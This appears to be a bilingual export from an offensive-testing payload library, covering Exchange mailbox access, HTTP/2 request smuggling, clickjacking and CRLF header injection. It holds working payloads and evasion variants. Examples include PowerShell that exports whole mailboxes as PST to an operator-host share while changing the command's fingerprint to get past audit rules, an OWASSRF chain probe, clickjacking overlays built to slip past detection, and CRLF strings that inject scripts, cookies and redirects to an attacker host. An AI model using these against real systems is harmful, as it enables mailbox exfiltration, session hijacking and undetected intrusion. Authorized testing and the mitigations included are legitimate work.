title.en: EWS NTLM direct access case variants

description.zh: 绕过对 /ews/Exchange.asmx 认证端点做字面监控的防护：NTLM 直连换大小写、尾斜杠、点段与 %3F 截断仍到达同一 EWS 终结点完成协商；成功判据：变形路径返回 200（WSDL/服务响应）且 NTLM 三次握手完成。
description.en: Bypasses literal-path monitoring of the /ews/Exchange.asmx auth endpoint: NTLM direct access with case change, trailing slash, dot segments and %3F truncation reaches the same endpoint and completes negotiation; success criterion: variants return 200 (WSDL/service response) after the NTLM handshake.

description.zh: 绕过只对 /owa 与 /ews 两个入口布防的访问控制：同一凭据改走 MAPI/HTTP、ActiveSync 与 Autodiscover.xml 三个备用协议端点验证邮箱可达性；成功判据：任一端点用 {LAB_USER} 凭据返回 200/207，证明邮箱边界在备用端点未收敛。
description.en: Bypasses access controls deployed only on the /owa and /ews entries: the same credentials probe the MAPI/HTTP, ActiveSync and Autodiscover.xml alternate protocol endpoints for mailbox reachability; success criterion: any endpoint returning 200/207 with {LAB_USER} credentials proves the mailbox boundary is not enforced on alternates.

title.zh: 导出请求过滤与命名变体
title.en: Export request filter and naming variants

wafBypass.command:
New-MailboxExportRequest -Mailbox {LAB_UPN} -FilePath "\\{LAB_OPERATOR_HOST}\share\user.pst" -Name WAFProbe01
New-MailboxExportRequest -Mailbox {LAB_UPN} -FilePath "\\{LAB_OPERATOR_HOST}\share\user2.pst" -ContentFilter "(Received -lt '2100-01-01')"
Get-MailboxExportRequest -Mailbox {LAB_UPN} | Where-Object Status -eq Queued | Get-MailboxExportRequestStatistics | Format-List

description.zh: 绕过对固定 New-MailboxExportRequest 命令模板的审计/告警规则：增加 -Name 与 -ContentFilter 参数使命令指纹变化而导出行为不变，再轮询统计确认执行；成功判据：请求进入 Queued/Completed 且统计返回 PST 路径与大小。
description.en: Bypasses audit/alert rules keyed on the fixed New-MailboxExportRequest template: adding -Name and -ContentFilter changes the command fingerprint without changing export behavior, then polling statistics confirms execution; success criterion: the request reaches Queued/Completed with the PST path and size returned.

description.zh: 以 /owa 匿名会话 Cookie 加 PopAuthPSS 令牌访问 /owa/PowerShell（ProxyNotShell 补丁后的 OWASSRF 回归利用链，CVE-2022-41080），验证 PowerShell 豁免链是否可达。成功判据：返回 200/230 而非 401，证明豁免链可达。
description.en: An anonymous /owa session cookie combined with a PopAuthPSS token reaches /owa/PowerShell, the OWASSRF regression chain tracked as CVE-2022-41080 that reappeared after the ProxyNotShell patches, probing whether the PowerShell exemption chain is reachable. Success: the endpoint answers 200 or 230 instead of 401, proving the exemption chain is live.

explanation.zh: 匿名 /owa 会话 Cookie 是豁免链入口
explanation.en: anonymous /owa session cookie opens the exemption chain
exemption chain target: the PowerShell endpoint

explanation.zh: PopAuthPSS 令牌以低权限 token 占位承载
explanation.en: PopAuthPSS token carried via the low-privilege token placeholder

title.zh: 建立Exchange 邮箱访问边界预检前置条件基线
title.en: Establish the Exchange Mailbox-Access Boundary Preflight Prerequisite Baseline

description.zh: 记录 Exchange 邮箱访问边界预检 的当前主体、单一授权资产、组件或工具版本、适用条件、正常基线和停止条件；不把工具存在或查询成功直接判定为漏洞。
description.en: Record the principal, one authorized asset, component or tool version, applicability conditions, normal baseline, and stop conditions for Exchange Mailbox-Access Boundary Preflight; do not treat tool availability or query success as a vulnerability.

title.zh: 运行一条Exchange 邮箱访问边界预检验证命令
title.en: Run One Exchange Mailbox-Access Boundary Preflight Validation Command

description.zh: 只在授权实验中运行 Exchange 邮箱访问边界预检 的第一条已审查命令，保存原始输出、时间戳、目标端日志和回滚状态，不串联其他动作。
description.en: Run only the first reviewed Exchange Mailbox-Access Boundary Preflight command in the authorized lab, preserving raw output, timestamps, target-side logs, and rollback state without chaining other actions.

attackChain.payload: curl -k -sS --max-time 5 -o /dev/null -w "%{http_code}\n" https://{EXCHANGE_HOST}/owa

title.zh: 关联Exchange 邮箱访问边界预检权威证据
title.en: Correlate Authoritative Exchange Mailbox-Access Boundary Preflight Evidence

description.zh: 把固定条数的元数据响应与租户配置、站点权限、Exchange RBAC 和统一审计日志对照，不下载邮件正文、文档内容或离线通讯录。
description.en: Compare a fixed-size metadata response with tenant configuration, site permissions, Exchange RBAC, and unified audit logs without downloading mail bodies, document content, or offline address books.

title.zh: 修复并回归Exchange 邮箱访问边界预检
title.en: Remediate and Retest Exchange Mailbox-Access Boundary Preflight

description.zh: 完成 Exchange 邮箱访问边界预检 对应的最小权限、补丁或配置修复后，以相同主体和同一条命令回归，确认正常管理能力保留且原证据链不再成立。
description.en: After the least-privilege, patch, or configuration remediation for Exchange Mailbox-Access Boundary Preflight, retest with the same principal and command to confirm legitimate administration remains available and the original evidence chain no longer holds.

overview.zh: Exchange 邮箱访问边界预检覆盖邮箱数据访问场景：针对持有实验账号凭据的测试主体，验证账号可触达的邮箱范围与导出能力。验证维度涵盖 OWA 端点探测、exchanger 登录列目录、执行链路标记与 PST 导出四类步骤。
overview.en: Exchange Mailbox-Access Boundary Preflight covers mailbox data access: for a test principal holding lab account credentials, verify the reachable mailbox scope and export capability. Verification dimensions cover OWA endpoint probing, exchanger login with folder listing, execution-chain marking, and PST export.

vulnerability.zh: 根因是邮箱角色与委派授权配置过宽或遗留认证未禁用时，单个实验账号即可读取超出其业务边界的邮箱数据；New-MailboxExportRequest 还允许把整个邮箱导出为 PST 落到任意 UNC 路径，形成批量数据外带通道。
vulnerability.en: The root cause is overly broad mailbox roles and delegation grants, or legacy authentication left enabled, letting a single lab account read mailboxes beyond its business boundary; New-MailboxExportRequest additionally exports entire mailboxes to arbitrary UNC paths as PST, creating a bulk exfiltration channel.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步访问 /owa 确认端点可用（返回登录页）；第 2 步用 exchanger.py 以实验账号登录并列出邮箱文件夹，确认可读范围；第 3 步用带尾斜杠的 /owa/ 路径复测并读取控制台输出的状态码（200/302 即链路贯通）；第 4 步用 New-MailboxExportRequest 把实验邮箱导出为 PST 到操作主机共享，导出完成且 PST 落盘即确认数据外带能力。占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 accesses /owa to confirm the endpoint (a login page returns); step 2 logs in with exchanger.py as the lab account and lists mailbox folders to confirm the readable scope; step 3 emits a marker string to verify the execution chain; step 4 exports the lab mailbox with New-MailboxExportRequest to the operator share — completed export with PST on disk confirms exfiltration capability. Replace placeholders via the global variables menu.

mitigation.zh:
按最小权限收紧邮箱与角色委派，禁用遗留认证，限制 New-MailboxExportRequest 使用主体并保留导出审计：
    # 仅受信管理员组可导出邮箱（RBAC 收敛）
    New-ManagementRoleAssignment -Role "Mailbox Import Export" -SecurityGroup "Trusted-MailAdmins"
    Set-CASMailbox -Identity svc-report -EwsEnabled $false -PopEnabled $false -ImapEnabled $false
    Get-MailboxExportRequest | Select-Object Requester,FilePath |
      Export-Csv C:\Audit\mailbox-exports.csv -NoTypeInformation
mitigation.en: Tighten mailbox and role delegation grants per least privilege, disable legacy authentication, restrict principals for cmdlets such as New-MailboxExportRequest with auditing retained, and alert on cross-mailbox reads and exports. After the fix, regress with the step 2 and step 4 samples: out-of-bound reads and exports must be denied with audit records.

analysis.zh: 证据必须包含测试身份、租户或站点、请求字段、结果上限和服务端授权日志；HTTP 200、产品版本或对象名称不能单独证明越权。
analysis.en: Evidence must identify the test identity, tenant or site, requested fields, result limit, and server authorization logs. HTTP 200, a product version, or an object name alone does not prove unauthorized access.

review.rationale: WAF4 批次3：按§四 4.11 E1追加 OWASSRF 回归链。

name.zh: HTTP/2 长度冲突走私探测

description.zh: 使用冲突 Content-Length 检查 HTTP/2 到 HTTP/1 降级过程中是否生成歧义正文长度。
description.en: Uses conflicting Content-Length values to test whether HTTP/2-to-HTTP/1 downgrade creates ambiguous body framing.

prerequisites.zh: 使用仅含测试流量的 HTTP/2 边缘到 HTTP/1 后端降级链，记录 H2 pseudo-header、合成 CL 与后端原始请求。
prerequisites.en: Use an HTTP/2 edge to HTTP/1 backend downgrade chain carrying only test traffic, recording H2 pseudo-headers, synthesized Content-Length, and raw backend requests.

prerequisites.zh: 以固定短 body 和随机 canary 路径测试冲突长度，配对单一正确长度与入口拒绝控制，禁用连接共享。
prerequisites.en: Test conflicting lengths with a fixed short body and random canary path, paired with one correct length and ingress-rejection controls, with connection sharing disabled.

title.en: Validation step 1 for HTTP/2 Length-Conflict Smuggling Probe

description.zh: 发送双 Content-Length 的 HTTP/2 请求；降级后产生长度冲突或第二请求，即确认 H2 降级定界缺陷。
description.en: Send the HTTP/2 request with dual Content-Length; length conflicts or a second request after downgrade confirm H2 downgrade-framing flaws.

opsecTips.zh: 首次形成一个额外 canary 后端请求后停止，不并发 H2 stream 或目标真实路径。
opsecTips.en: Stop after first forming one extra canary backend request; do not add concurrent H2 streams or target real paths.

opsecTips.zh: 关闭 H2 会话，清空降级代理/后端连接池和 trace，重建测试链并恢复冲突长度拒绝。
opsecTips.en: Close H2 sessions, clear downgrade-proxy and backend pools and traces, rebuild the test chain, and restore rejection of conflicting lengths.

title.zh: h2 降级 CL+TE 共存

description.zh: h2 请求携带 CL 与 TE 头降级到 h1 时分帧分歧。判据：响应异常或走私生效。
description.en: Carrying both CL and TE over h2 splits framing on downgrade. Success: abnormal response or smuggle.

description.zh: h2c 升级绕过中间件（其只识别 h1）。判据：升级成功后直连后端。
description.en: h2c upgrade bypasses h1-only middleboxes. Success: direct backend channel after upgrade.

description.zh: h2 层双 CL 在降级代理处歧义。判据：后端按不同 CL 分帧。
description.en: Dual CL over h2 confuses downgrading proxies. Success: backend frames by a different CL.

description.zh: :method 等伪头部置于普通头之后触发宽容解析差异。判据：内网路径可达。
description.en: Pseudo-headers after regular headers trigger lenient parsing. Success: internal path reached.

description.zh: RFC 9113 第 8.2.2 节要求 h2 端点拒收 TE 头；接受 TE 并向 h1 降级转发的前端构成 h2.TE 差分。与既有 CL+TE 共存变体互补，此处仅携带 transfer-encoding 单头。成功判据：请求未被 GOAWAY 拒绝且后端出现分帧歧义或超时。
description.en: RFC 9113 section 8.2.2 requires h2 endpoints to reject Transfer-Encoding headers; a front end that accepts the header and forwards the request downgraded to h1 forms the h2.TE differential. It complements the existing CL+TE coexistence variant by carrying the transfer-encoding header alone. Success: the request is not refused with GOAWAY while the backend shows framing ambiguity or a timeout.

explanation.zh: h2 规范禁止的头，接受即构成差分
explanation.en: header forbidden over h2; acceptance itself is the differential

explanation.zh: 原生 HTTP/2 客户端，显示连接级响应
explanation.en: native HTTP/2 client surfacing connection-level responses

title.zh: 建立H2 降级请求定界基线
title.en: Establish the HTTP/2 Downgrade Framing baseline

description.zh: 记录端到端 H2 与 H2-to-H1 降级链路上的正常 POST 和单一长度请求，并保存原始请求、响应与服务端关联标识。
description.en: Record normal POST and single-length behavior over end-to-end H2 and H2-to-H1 downgrade paths, retaining raw requests, responses, and server correlation identifiers.

title.zh: 执行H2 降级请求定界变体
title.en: Execute the HTTP/2 Downgrade Framing variants

description.zh: 逐项发送原始重复长度结构并使用随机无害正文，在隔离连接追踪降级字节，严格保持其他变量不变并设置停止阈值。
description.en: Send original duplicate-length structures one at a time with a random harmless body and trace downgraded bytes on isolated connections, holding all other variables constant and defining a stop threshold.

title.zh: 核验HTTP/2 长度冲突走私探测证据
title.en: Verify evidence for HTTP/2 Length-Conflict Smuggling Probe

description.zh: 从后端原始请求日志确认降级后长度冲突导致额外请求或正文错位；同时排除H2 库拒绝重复长度、边缘重写为单值或仅客户端报协议错误。
description.en: Confirm from raw backend request logs that downgraded length conflicts cause an extra request or body misalignment; also exclude H2 libraries rejecting duplicate lengths, edge rewriting to one value, or client-only protocol errors.

attackChain.payload: curl -i --http2 'http://{TARGET}/'

overview.zh: 该 Payload 覆盖 HTTP/2 降级定界走私场景，检验 H2 到 H1 转换对冲突 Content-Length 的处理。验证维度为双 CL 值的 H2 请求构造与降级后行为观察，对应第 1 步。
overview.en: This payload covers HTTP/2 downgrade delimiting smuggles, testing H2-to-H1 handling of conflicting Content-Length values. Validation builds the dual-CL H2 request and observes post-downgrade behavior, mapped to step 1.

vulnerability.zh: 根因在于 H2 层未拒绝重复 Content-Length 而降级时把两个值写入 H1 报文：下游按不同值解析出不同正文长度，剩余字节成为走私请求。
vulnerability.en: The root cause is the H2 layer not refusing duplicate Content-Length while downgrade writes both values into the H1 message: downstream parses different body lengths per value, turning leftover bytes into a smuggled request.

exploitation.zh: 第 1 步按脚本构造携带双 CL 的 H2 请求经代理发送并观察响应与下游日志：降级后出现长度冲突错误或第二请求执行即确认定界缺陷，记录代理的转换行为作为责任证据。成功判据以走私或报错证据为准。占位符在全局变量菜单替换。
exploitation.en: In step 1, build the dual-CL H2 request per the script and send it through the proxy, observing responses and downstream logs; length-conflict errors or a second request executing after downgrade confirm the delimiting defect, with proxy conversion behavior logged as responsibility evidence. Judge success by smuggling or error evidence. Replace placeholders via the global variables menu.

mitigation.zh:
H2 层拒绝重复或冲突的伪头长度字段，降级转换器对歧义请求直接断流，监控转换层报错。
    frontend fe
        bind :443 alpn h2,http/1.1
        # H2 请求拒绝重复/冲突 content-length 伪头
        http-request deny if { req.hdr_cnt(Content-Length) gt 1 }
  修复后重放验证第 1 步，双 CL 请求应在 H2 层即被拒绝。
mitigation.en: Refuse duplicate or conflicting pseudo-header lengths at the H2 layer, with downgraders cutting off ambiguous requests; monitor conversion-layer errors. After the fix, replay step 1: dual-CL requests should be refused at H2 itself.

analysis.zh: 阳性要求 H2 边缘接受冲突长度并在降级时生成歧义 H1 framing，使后端解析额外 canary 或下一请求被前缀污染，跨层 stream/connection ID 可关联。H2 协议错误、边缘删除重复 CL、400、body 长度不匹配、单次 reset 或没有后端第二请求都不是降级走私。
analysis.en: Positive evidence requires the H2 edge to accept conflicting lengths and synthesize ambiguous H1 framing during downgrade so the backend parses an extra canary or prefixes the next request, correlated by stream and connection IDs. H2 protocol errors, duplicate-CL removal, HTTP 400, body-length mismatch, one stream reset, or no second backend request is not downgrade smuggling.

review.rationale: WAF4 批次3：按§四 4.2 S3追加 HTTP/2 TE 头降级差分。

name.zh: 透明覆盖式点击劫持

description.zh: 验证敏感页面是否可被跨站 iframe 嵌入并以透明覆盖诱导用户在错误视觉语境中触发真实操作。
description.en: Tests whether a sensitive page can be embedded cross-origin and transparently overlaid so a user triggers a real action under a misleading visual context.

prerequisites.zh: 敏感页面可被跨源 iframe 嵌入，测试浏览器真实执行 X-Frame-Options/CSP frame-ancestors，目标操作需要可模拟的用户点击。
prerequisites.en: A sensitive page can be embedded cross-origin, the test browser enforces actual X-Frame-Options or CSP frame-ancestors, and the target action requires a simulatable user click.

prerequisites.zh: 使用隔离敏感操作和测试账户，在可见调试模式先对齐 iframe/诱饵按钮，再以自动化截图、坐标和网络事件验证，不操作真实功能。
prerequisites.en: An isolated sensitive action and test account align iframe and decoy controls in visible debug mode before automated screenshots, coordinates, and network events validate behavior without touching real functions.

description.zh: 把透明 iframe 对齐到诱饵按钮上方并点击；目标页敏感操作在无感知交互下被触发，即确认点击劫持可行。
description.en: Overlay the transparent iframe over the decoy button and click; the target page sensitive action firing from the unnoticed interaction confirms clickjacking.

opsecTips.zh: 点击劫持测试只触发无副作用 marker，禁止转账/授权/删除；出现真实业务动作、非测试账户、焦点劫持、弹窗或用户交互时停止。
opsecTips.en: Clickjacking testing triggers a side-effect-free marker only and forbids transfers, authorization, or deletion; stop on real business actions, nontest accounts, focus hijacking, popups, or user interaction.

opsecTips.zh: 关闭测试父页/iframe，会话退出并删除 marker 操作，清理浏览器存储/截图/录屏，恢复 frame-ancestors/XFO 后回归。
opsecTips.en: Close test parent pages and frames, sign out and delete marker actions, clear browser storage, screenshots, and recordings, restore frame-ancestors or XFO, and regress.

description.zh: 绕过首屏快照类检测：框架初始全透明数秒后显现；交互期内点击仍劫持目标即成功。
description.en: Start fully transparent and reveal later past first-screen snapshot detection; clicks during the interactive window still hijacking the target confirm success.

description.zh: 绕过对固定定位特征的规则：以 transform 移出视口并在悬停时回位；点击命中目标按钮即成功。
description.en: Shift the frame off-viewport via transform and snap back on hover past fixed-position rules; a click hitting the target button confirms success.

wafBypass.command: <!-- 攻击页 --><iframe src="https://{WRAPPER_HOST}/wrap" style="width:100vw;height:100vh"></iframe><!-- 上述 {WRAPPER_HOST}/wrap 页面本体需返回： --><iframe src="https://{TARGET}/sensitive-action" style="opacity:0.1;position:absolute"></iframe>

description.zh: 绕过目标仅信任外层域的 frame-ancestors 配置：外层合法包装页内嵌目标页；内层可交互即成功。
description.en: Exploit frame-ancestors trust placed only on the wrapper domain by nesting the target inside; the inner layer being interactive confirms success.

description.zh: 绕过 opacity<1 阈值检测：不透明度保持 1 借混合模式在白底隐形；覆盖层点击穿透目标即成功。
description.en: Keep opacity at 1 and vanish via blend mode on a white background past low-opacity thresholds; overlay clicks reaching the target confirm success.

description.zh: 绕过全屏覆盖特征：初始离屏在指针移动时回滑到位；回滑后交互命中目标控件即成功。
description.en: Park offscreen and slide back on pointer movement past full-screen-overlay signatures; post-slide interactions hitting target controls confirm success.

description.zh: 以渲染跳过属性替代透明度隐藏：定时恢复可见后承载点击；恢复期内点击命中目标即成功。
description.en: Hide via render-skipping instead of transparency and restore on a timer; clicks during the restored window hitting the target confirm success.

title.en: Validation step 1 for Transparent iframe Clickjacking Validation

description.zh: 用不同透明度的 iframe 覆盖目标页；opacity:0 与 0.0001 的帧仍接收点击并触发敏感操作即确认 iframe 覆盖可行（visibility:hidden 的帧不接收指针事件，只能作阴性对照）。
description.en: Overlay the target page with iframes of varying opacity and visibility; low-visibility frames still receiving clicks and firing the sensitive action confirms iframe overlaying.

description.zh: 以 zoom 替代 opacity 与 transform 做初始缩放隐形，规避尺寸与透明度两类静态检测；指针移动后恢复 1:1 覆盖完成点击劫持。成功判据：恢复后点击命中目标控件。失效条件：X-Frame-Options 或 frame-ancestors 阻止嵌入。
description.en: The zoom property replaces opacity and transform for the initial invisible scaling, evading both size-based and transparency-based static detection; pointer movement restores 1:1 coverage to complete the clickjacking overlay. Success: after the reset, clicks land on the target control. Failure condition: X-Frame-Options or frame-ancestors blocks framing.

explanation.zh: 初始 1% 缩放隐形，避开透明度与尺寸检测
explanation.en: initial 1% scaling hides the frame from size and opacity checks

explanation.zh: 指针移动后回位 1:1 覆盖

description.zh: 从独立测试域加载目标并记录 frame-ancestors、X-Frame-Options 与会话状态。
description.en: Load the target from a separate test origin and record frame-ancestors, X-Frame-Options, and session state.

description.zh: 回放原始 iframe 覆盖布局，以测试账号执行可回滚操作并记录真实点击命中。
description.en: Replay the original iframe overlay with a test account, perform a reversible action, and record the actual click target.

description.zh: 部署 frame-ancestors 和确认步骤后复测，确认授权嵌入保留且跨源诱导流程被阻断。
description.en: Retest after frame-ancestors and confirmation controls to preserve authorized embedding while blocking cross-origin lure flows.

overview.zh: 该 Payload 覆盖透明覆盖式点击劫持场景，检验敏感页面被跨站嵌入后诱导点击的可行性。验证维度为透明与半透明 iframe 叠加对齐的单步样例，对应第 1 步。
overview.en: This payload covers transparent-overlay clickjacking, testing feasibility of lured clicks after a sensitive page is cross-site embedded. Validation overlays transparent and semi-transparent iframes in one aligned sample, mapped to step 1.

vulnerability.zh: 根因在于敏感页面缺少 Frame 嵌入防护且操作即时生效：攻击者以近乎不可见的 iframe 对齐诱饵界面，受害者的点击被转移到真实控件。
vulnerability.en: The root cause is sensitive pages lacking frame protection with instant-action controls: attackers align a near-invisible iframe over a decoy interface, transferring victim clicks onto real controls.

exploitation.zh: 第 1 步部署含透明 iframe 的诱饵页，把目标敏感操作页对齐到诱饵按钮上方，调整透明度与坐标后点击验证：目标操作在无感知交互下被执行即确认劫持可行，记录响应头以核对防护缺失。成功判据以目标端操作执行记录为准。占位符在全局变量菜单替换；使用实验合成操作避免真实影响。
exploitation.en: In step 1, deploy a decoy page with a transparent iframe, align the target sensitive-action page above the decoy button, tune opacity and coordinates, then click; the target action executing without the victim's awareness confirms the hijack, and record response headers to verify missing protection. Judge success by execution records on the target side. Replace placeholders via the global variables menu; use lab synthetic actions to avoid real impact.

mitigation.en: Serve frame-ancestors none or SAMEORIGIN on sensitive pages, add second confirmation for critical actions, and randomize control positions. After the fix, replay step 1: the browser should refuse the iframe and no execution records appear.

analysis.zh: 阳性证据是跨源 iframe 成功加载且受控一次点击落在真实敏感控件上，触发专用 marker 操作；嵌入、坐标和服务端事件需对应。 假阳性边界：iframe 标签存在、浏览器显示空白/阻止页、截图视觉重叠但点击落在诱饵、需多次非预期交互、SameSite/CSP 阻断操作或仅缺少 Header 均不是可利用链。
analysis.en: Positive evidence requires the cross-origin iframe to load and one controlled click to land on the real sensitive control and trigger a dedicated marker action, correlating embedding, coordinates, and server event. False-positive boundary: An iframe tag, blank or blocked frame, visual overlap with clicks landing on the decoy, multiple unexpected interactions, SameSite or CSP blocking, or a missing header alone does not prove an exploitable chain.

review.rationale: WAF4 批次3：按§四 4.9 K1追加 zoom 初始缩放回位。

name.zh: HTTP CRLF 响应头注入

description.zh: 验证请求输入在服务端解码后是否进入 HTTP 响应头并注入新的 Header、Cookie、Location 或响应正文边界。
description.en: Tests whether request input is decoded into an HTTP response header and injects a new header, cookie, location, or response-body boundary.

prerequisites.zh: 请求参数经实际解码/规范化后被写入 HTTP 响应头值，响应由可观察的 HTTP/1.1 serializer 生成而非仅应用日志。
prerequisites.en: A request parameter is decoded and normalized into an HTTP response-header value generated by an observable HTTP/1.1 serializer rather than an application log only.

prerequisites.zh: 使用唯一 X-Test-CRLF marker 和无敏感测试 Cookie/Location，抓取客户端可见原始响应字节，并记录代理、框架与服务器各层值。
prerequisites.en: A unique X-Test-CRLF marker plus nonsensitive test Cookie or Location is used, capturing client-visible raw response bytes and values at proxy, framework, and server layers.

execution.command:
%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert()</script>
%0d%0aSet-Cookie:%20sessionid=attacker
%0d%0aLocation:%20http://{ATTACKER_HOST}
\r\nContent-Type: text/html\r\n\r\n<script>alert()</script>
\r\nSet-Cookie: sessionid=attacker
\r\nX-Injected: header
\nContent-Type: text/html\n\n<script>alert()</script>
/%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert()</script>
Host: {TARGET}%0d%0aInjected-Header: value
User-Agent: Mozilla/5.0%0d%0aX-Injected: value

description.zh: 将 CRLF 编码变体注入头值或路径并逐条观察响应；响应出现注入的 Set-Cookie、Location 或自定义头，即确认响应头注入。
description.en: Inject CRLF-encoded variants into header values or paths and inspect responses one by one; injected Set-Cookie, Location, or custom headers confirm response-header injection.

opsecTips.zh: CRLF 测试只注入 X-Test 标头，不设置真实 session、缓存或外部 Location；出现缓存污染、用户 Cookie、响应错位或代理连接异常时停止。
opsecTips.en: CRLF testing injects an X-Test header only and never real sessions, cache directives, or external Location values; stop on cache contamination, user cookies, response desynchronization, or proxy-connection anomalies.

opsecTips.zh: 删除测试参数/响应对象，清理代理/CDN/浏览器缓存和测试 Cookie，关闭原始抓包，恢复头值校验后回归。
opsecTips.en: Delete test parameters and response objects, clear proxy, CDN, and browser caches plus test cookies, close raw captures, restore header-value validation, and regress.

title.zh: 双重/三重 URL 编码变形

description.zh: 绕过只解码一次即匹配 %0d%0a 的 WAF：应用在 WAF 之后又做一次解码（双重解码漏洞）时，%250d%250a/%25250d%25250a 逐层还原出 CRLF 完成响应分割；成功判据：响应头多出注入的 Content-Type/Set-Cookie 或响应体出现脚本。失效条件：仅对做二次 URL 解码的架构成立。
description.en: Bypasses WAFs that decode once before matching %0d%0a: when the application decodes again after the WAF (double-decode flaw), %250d%250a/%25250d%25250a restore CRLF layer by layer for response splitting; success criterion: injected Content-Type/Set-Cookie headers or script content appear in the response. Failure condition: only works on architectures that run a second URL decode pass.

title.zh: 过长 UTF-8 与 Unicode 编码

description.zh: 绕过按标准 %0d%0a 字节对签名的规则：%c0%8d%c0%8a 等过长 UTF-8 序列与 %u000d%u000a 宽 Unicode 转义在被宽容解码的容器（旧 IIS/Java）里还原为 CR/LF；成功判据：响应头出现 X-Injected/注入头，证明解码后发生了响应分割。
description.en: Bypasses rules signed on the canonical %0d%0a byte pair: overlong UTF-8 sequences like %c0%8d%c0%8a and wide %u000d%u000a escapes decode to CR/LF on lenient containers (legacy IIS/Java); success criterion: injected headers such as X-Injected appear, proving response splitting after decoding.

title.zh: 头名大小写与 OWS 变形

description.zh: 绕过对 "%0d%0aContent-Type:%20" 固定模板（含编码空格）的规则：头名大小写、冒号后制表符/双空格/无空格/冒号前空格等 OWS 形态由解析器归一；成功判据：响应 Content-Type 变为 text/html 或出现注入 Set-Cookie。
description.en: Bypasses rules on the fixed "%0d%0aContent-Type:%20" template (encoded space): header-name case, tab/double-space/no-space after the colon and space-before-colon are normalized by parsers; success criterion: response Content-Type becomes text/html or the injected Set-Cookie appears.

title.zh: 空字节与混合分隔变形

description.zh: 绕过要求 CRLF 成对出现或截断空字节的过滤：NUL 前缀/中缀被部分容器丢弃后仍拼出完整 CRLF，乱序 LF-CR 组合也被宽容解析器接受；成功判据：响应头/体出现注入内容（X-Injected、Set-Cookie 或脚本）。
description.en: Bypasses filters requiring paired CRLF or truncating at NUL: null prefixes/infixes are dropped by some containers leaving valid CRLF, and out-of-order LF-CR mixes are accepted by lenient parsers; success criterion: injected content (X-Injected, Set-Cookie or script) shows up in the response.

title.zh: 参数污染与上下文注入

description.zh: 绕过对单一参数值做 CRLF 检测的规则：把载荷放进 HPP 的第二个同名参数或路径/fragment 交界处，取值差异使 WAF 看到干净值而应用取到污染值；成功判据：响应发生重定向到攻击域或出现注入 Cookie。
description.en: Bypasses CRLF detection scoped to a single parameter value: placing the payload in a second same-name HPP parameter or at the path/fragment boundary lets the WAF see the clean value while the app takes the polluted one; success criterion: the response redirects to the attacker host or carries the injected cookie.

description.zh: 仅用 %0a 绕过同时匹配 %0d%0a 的规则，多数解析器接受裸 LF 换头；成功判据：响应出现注入的响应头。
description.en: Uses %0a alone to evade rules matching the %0d%0a pair; many parsers accept bare LF. Success: the injected header appears in the response.

description.zh: U+560A U+560D 在部分归一化管线还原为 CRLF，规避字节级 %0d%0a 检测；成功判据：服务端还原后响应头被注入。
description.en: U+560A U+560D normalize to CRLF in some pipelines, evading byte-level %0d%0a detection. Success: the server materializes the injected header.

description.zh: 双重编码绕过一次解码后再匹配 CRLF 的 WAF；成功判据：应用二次解码后响应头注入成功。失效条件：仅对做二次 URL 解码的架构成立。
description.en: Double encoding survives WAFs that match CRLF after a single decode. Success: the header injects after the app's second decode. Failure condition: only works on architectures that run a second URL decode pass.

title.zh: 编码 CRLF 响应头样例

description.zh: 逐条放入已确认会进入响应头的测试参数，使用自有测试来源与无敏感 Cookie，检查原始响应头结构。命中判据：响应头出现注入的 Location/Set-Cookie 或正文被拆分。受控样例：用于建立基线/对照，非独立绕过手法。
description.en: Place each line separately in a confirmed response-header input, use a controlled origin and nonsensitive cookie, and inspect the raw header structure. Success check: the response headers contain the injected Location/Set-Cookie or the body is split. Controlled sample: establishes a baseline or control and is not a standalone bypass technique.

description.zh: 在 CRLF 可注入前提下，注入 X-Accel-Redirect 头触发 Nginx 内部重定向到 deny 规则外的内部路径，影响大于 Set-Cookie 注入。成功判据：响应体变为内部路径内容。失效条件：现代栈拒绝头值 CR/LF 或未配置内部重定向。
description.en: Given an injectable CRLF position, injecting the X-Accel-Redirect header triggers an Nginx internal redirect to an internal path outside the deny rules, with impact beyond a Set-Cookie injection. Success: the response body switches to the internal path content. Failure condition: the modern stack rejects CR/LF inside header values or internal redirects are not configured.

explanation.zh: CRLF 注入点，新起一个响应头
explanation.en: CRLF injection opening a new response header

explanation.zh: Nginx 内部重定向指令，绕过外部 deny 规则
explanation.en: Nginx internal redirect directive bypassing external deny rules

description.zh: 确认输入由哪个组件写入哪个响应头，并保存不含换行时的代理与源站基线。
description.en: Identify which component writes input into which response header and preserve proxy and origin baselines without newlines.

title.zh: 捕获 CRLF 原始字节

description.zh: 提交原始集合并比较代理前后字节，验证新增 Header、Cookie 或正文边界是否存在。
description.en: Submit the original set and compare bytes before and after the proxy to verify any new header, cookie, or body boundary.

attackChain.payload:
%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert()</script>
%0d%0aSet-Cookie:%20sessionid=attacker
%0d%0aLocation:%20http://{ATTACKER_HOST}
\r\nContent-Type: text/html\r\n\r\n<script>alert()</script>
\r\nSet-Cookie: sessionid=attacker
\r\nX-Injected: header
\nContent-Type: text/html\n\n<script>alert()</script>
/%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert()</script>
Host: {TARGET}%0d%0aInjected-Header: value
User-Agent: Mozilla/5.0%0d%0aX-Injected: value

title.zh: 回归 Header API 校验

description.zh: 切换到安全 Header API 并统一解码后重放，确认正常值保留且所有换行形式被拒绝。
description.en: Replay after adopting safe header APIs and aligned decoding to confirm normal values remain and all newline forms are rejected.

overview.zh: 该 Payload 覆盖 HTTP 响应头注入场景，检验请求输入进入响应头后能否拆分出新的 Header、Cookie 与正文边界。验证维度为 CRLF 编码变体注入头值与路径的单步矩阵，对应第 1 步。
overview.en: This payload covers HTTP response-header injection, testing whether request input entering headers can split out new headers, cookies and body boundaries. Validation injects CRLF-encoded variants into header values and paths in a single-step matrix, mapped to step 1.

vulnerability.zh: 根因在于服务端把未过滤回车换行的用户输入写入响应头：一旦解码层放行编码序列，浏览器即按头边界解析出攻击者定义的 Set-Cookie、Location 或正文。
vulnerability.en: The root cause is the server writing user input with unfiltered carriage returns into response headers: once a decoding layer passes encoded sequences, the browser parses attacker-defined Set-Cookie, Location or body content at header boundaries.

